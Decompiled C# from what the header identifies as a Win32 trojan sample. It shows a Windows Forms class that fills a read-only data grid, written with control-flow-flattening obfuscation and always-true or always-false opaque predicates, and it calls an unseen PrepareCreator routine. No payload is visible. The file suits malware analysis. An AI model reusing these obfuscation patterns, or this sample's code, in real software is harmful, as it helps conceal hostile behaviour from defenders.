// Decompiled with JetBrains decompiler
// Type: ProjNet.Structs.RegAdvisorStructBuilder
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using ProjNet.Services;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ProjNet.Structs
{
  public class RegAdvisorStructBuilder : Form
  {
    private IContainer _WorkerAdvisor;
    private DataGridView m_CustomerAdvisor;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public RegAdvisorStructBuilder()
    {
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            PageAdvisorStructBuilder.PrepareCreator();
            num = 5;
            continue;
          case 1:
          case 2:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            this.InsertStatus();
            goto case 4;
          case 4:
            this.m_CustomerAdvisor.DataSource = (object) CallbackRegistry.InitAdvisor();
            if (true)
            {
              num = 6;
              continue;
            }
            goto case 0;
          case 5:
            this._WorkerAdvisor = (IContainer) null;
            if (true)
            {
              num = 1;
              continue;
            }
            goto case 1;
          case 6:
            goto label_8;
          default:
            if (true)
            {
              num = 4;
              continue;
            }
            goto label_7;
        }
      }
label_8:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool istask)
    {
      int num1 = 0;
      if (RegAdvisorStructBuilder.RunModel())
        ;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
label_9:
            if (!istask)
            {
              num2 = 0;
              break;
            }
            num1 = 3;
            continue;
          case 1:
          case 3:
            num2 = this._WorkerAdvisor != null ? 1 : 0;
            break;
          case 2:
          case 4:
label_7:
            this._WorkerAdvisor.Dispose();
            goto label_8;
          case 5:
            goto label_4;
          default:
            num1 = 4;
            continue;
        }
        if (num2 != 0)
          goto label_7;
label_8:
        base.Dispose(istask);
        if (true)
          num1 = 5;
        else
          goto label_9;
      }
label_4:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InsertStatus()
    {
      int num1 = 2;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
            ((ISupportInitialize) this.m_CustomerAdvisor).BeginInit();
            this.SuspendLayout();
            this.m_CustomerAdvisor.AllowUserToAddRows = false;
            this.m_CustomerAdvisor.AllowUserToDeleteRows = false;
            this.m_CustomerAdvisor.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            num2 = 6;
            break;
          case 1:
            this.Controls.Add((Control) this.m_CustomerAdvisor);
            num1 = 7;
            continue;
          case 2:
            this.m_CustomerAdvisor = new DataGridView();
            num2 = 0;
            break;
          case 3:
          case 8:
            this.m_CustomerAdvisor.Name = "dataGridView";
            this.m_CustomerAdvisor.ReadOnly = true;
            this.m_CustomerAdvisor.Size = new Size(535, 213);
            this.m_CustomerAdvisor.TabIndex = 0;
            if (true)
            {
              num1 = 9;
              continue;
            }
            goto case 2;
          case 4:
          case 5:
            this.ClientSize = new Size(535, 213);
            int num3 = 1;
            num1 = RegAdvisorStructBuilder.RunModel() ? num3 : num3;
            continue;
          case 6:
            this.m_CustomerAdvisor.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            this.m_CustomerAdvisor.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.m_CustomerAdvisor.Dock = DockStyle.Fill;
            this.m_CustomerAdvisor.Location = new Point(0, 0);
            if (!RegAdvisorStructBuilder.RunModel())
            {
              num1 = 8;
              continue;
            }
            goto case 7;
          case 7:
            this.Name = "ReadTitlesChildForm";
            this.Text = "Titles";
            ((ISupportInitialize) this.m_CustomerAdvisor).EndInit();
            this.ResumeLayout(false);
            num2 = 10;
            break;
          case 9:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.AutoSize = true;
            goto case 4;
          case 10:
            goto label_9;
          default:
            if (RegAdvisorStructBuilder.ConnectModel())
            {
              num1 = 4;
              continue;
            }
            goto case 6;
        }
        num1 = num2;
      }
label_9:;
    }

    internal static bool ConnectModel() => true;

    internal static bool RunModel() => false;
  }
}
